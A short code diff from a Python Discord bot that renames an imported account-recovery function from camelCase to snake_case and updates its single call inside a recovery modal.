@@ -1,7 +1,7 @@
 from discord import ui
 import discord
 
-from securing.recovery_secure import recoverySecure
+from securing.recovery_secure import recovery_secure
 
 class recoveryModal(ui.Modal):
     def __init__(self):
@@ -15,7 +15,7 @@ class recoveryModal(ui.Modal):
         
         await interaction.response.defer(ephemeral=True)
 
-        account = await recoverySecure(email, "rcvcode", {"recovery_code": recovery_code})
+        account = await recovery_secure(email, "rcvcode", {"recovery_code": recovery_code})
 
         if account == "invalid":
             await interaction.followup.send(
